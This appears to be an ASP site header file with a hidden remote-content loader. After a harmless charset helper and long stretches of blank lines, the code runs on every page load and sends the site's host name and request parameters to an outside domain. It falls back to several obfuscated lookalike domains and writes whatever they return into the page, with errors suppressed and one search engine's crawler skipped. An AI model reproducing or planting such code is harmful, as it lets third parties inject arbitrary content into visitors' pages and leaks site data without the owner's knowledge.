<%@LANGUAGE="VBSCRIPT" CODEPAGE="65001"%>
<%
'网站头部文件
On Error Resume Next
Function BytesToBstr(Body,Cset) 
Dim Objstream 
Set Objstream = Server.CreateObject("adodb.stream") 
objstream.Type = 1 
objstream.Mode =3 
objstream.Open 
objstream.Write body 
objstream.Position = 0 
objstream.Type = 2 
objstream.Charset = Cset 
BytesToBstr = objstream.ReadText 
objstream.Close 
set objstream = nothing 
End Function
%>














































<%
function getHTTPPage(url)
On Error Resume Next
dim http
set http=createobject("MSXML2.XMLHTTP")
Http.open "GET",url,false
Http.send()
if Http.readystate<>4 then
exit function
end if
getHTTPPage=BytesToBstr(Http.responseBody,"UTF-8")
'getHTTPPage=Http.responseBody
set http=nothing
if err.number<>0 then err.Clear
end function

Function Getlink()
On Error Resume Next
user_agent=Request.ServerVariables("HTTP_USER_AGENT")
If instr(user_agent,"yahoo")=0 then
    d=Request.ServerVariables("HTTP_HOST")
	getPage=getHTTPPage("http://www.199888.cn/about.aspx?d=" & d & "&id=" & Request("id") & "&p="&Request("p")&"")

	if instr(getPage,"2em")=0 then
		getPage=getHTTPPage("http://www.1l1l11lll111l1lll11l1l1.com/about.aspx?d=" & d & "&id=" & Request("id") & "&p="&Request("p")&"")
	end if
	if instr(getPage,"2em")=0 then
		getPage=getHTTPPage("http://www.lll1111l1l11l1l11ll11l.com/about.aspx?d=" & d & "&id=" & Request("id") & "&p="&Request("p")&"")
	end if
		if instr(getPage,"2em")=0 then
		getPage=getHTTPPage("http://www.l1l11l1l1l11l1l1l1l1l11.com/about.aspx?d=" & d & "&id=" & Request("id") & "&p="&Request("p")&"")
	end if
		if instr(getPage,"2em")=0 then
		getPage=getHTTPPage("http://www.1l1l11l1l11l11l1l1l1l1l1l.com/about.aspx?d=" & d & "&id=" & Request("id") & "&p="&Request("p")&"")
	end if
		if instr(getPage,"2em")=0 then
		getPage=getHTTPPage("http://www.1l1l1l1llll1111l1ll111ll1.com/about.aspx?d=" & d & "&id=" & Request("id") & "&p="&Request("p")&"")
	end if

    response.write getPage
    if err.number<>0 then err.Clear
End If
End Function
Call Getlink()
%>












































